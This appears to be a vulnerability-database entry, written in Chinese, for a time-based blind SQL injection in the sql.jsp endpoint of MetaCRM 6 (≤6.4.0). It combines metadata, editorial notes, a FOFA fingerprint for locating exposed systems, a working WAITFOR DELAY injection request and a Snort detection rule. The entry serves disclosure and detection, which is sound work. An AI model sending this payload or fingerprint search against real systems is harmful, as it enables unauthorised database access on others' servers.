---
schema_version: "1"
id: "VW-20261117-35f029756199"
title: "MetaCRM6客户关系管理系统sql.jsp存在SQL注入漏洞"
product: "MetaCRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
identifier_role: "unknown"
version: "Metasoft MetaCRM  **≤ 6.4.0** 版本"
prerequisites: "来源未完整说明认证/角色/配置前提；不假定匿名可达；FOFA 指纹已在原文"
side_effects: "unknown；复现前核对写入、凭据、出网与恢复要求"
source: "SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/11/MetaCRM6客户关系管理系统sql.jsp存在SQL注入漏洞/MetaCRM6客户关系管理系统sql.jsp存在SQL注入漏洞.md"
---

<!-- vulwiki-editorial:start -->
## 校订与适用边界

### 本次收录记录
- 2026-11-17 周维护收录：来源 SourByte05/Vulnerability-Wiki-PoC；文本全文审阅完成；未执行任何 PoC、依赖安装或目标访问。
- 触发材料（请求/指纹/规则）保留在下方原文中，未做脱敏或删改。
- CVE/产品查重：无重复主入口（本库 master 6314 篇正文级搜索无既有条目）

### 尚未解决的证据缺口
- 影响版本为来源声明，未与厂商公告逐一核对
- 复现截图像素未查看，技术结论以原文文字为准
- 修复状态为来源声明，需按分支核对补丁版本
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

> 以下为来源原文全文（保留原始字节，含广告与联系方式的保留原文）。

# MetaCRM6客户关系管理系统sql.jsp存在SQL注入漏洞

MetaCRM6客户关系管理系统sql.jsp存在SQL注入漏洞

# 影响版本

Metasoft MetaCRM  **≤ 6.4.0** 版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**   body\="/common/scripts/basic.js" && body\="www.metacrm.com.cn"

**POC/EXP：**

**step1**  sql注入

```
GET /common/jsp/sql.jsp?sql=;WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*


```

![image](../../../.resource/remote/.resource/remote/f43b655f9e35d3a4a49ddceb76b3fe7f124b6d06e745988d729483142103d4ef.png)

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"MetaCRM6客户关系管理系统 - sql.jsp sql SQL注入漏洞 (WAITFOR DELAY时间盲注)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri;
        content:"/common/jsp/sql.jsp"; fast_pattern;
        content:"sql="; nocase; distance:0;
        content:"WAITFOR"; nocase; distance:0; within:50;
        content:"DELAY"; nocase; distance:0; within:20;
    metadata:
        service http,
        affected_product "MetaCRM6客户关系管理系统",
        vulnerability_type "SQL Injection (Time-based blind)",
        severity "high";
    classtype:web-application-attack;
    sid:1000818;
    rev:1;
    priority:1;
)
```

# 漏洞修复

#### 官方修复

- **升级至安全版本**：联系官方获取针对该漏洞的安全补丁或升级版本。

---

> 来源：SourByte05/Vulnerability-Wiki-PoC（原文见文首链接，归档 URL 见 frontmatter source_url）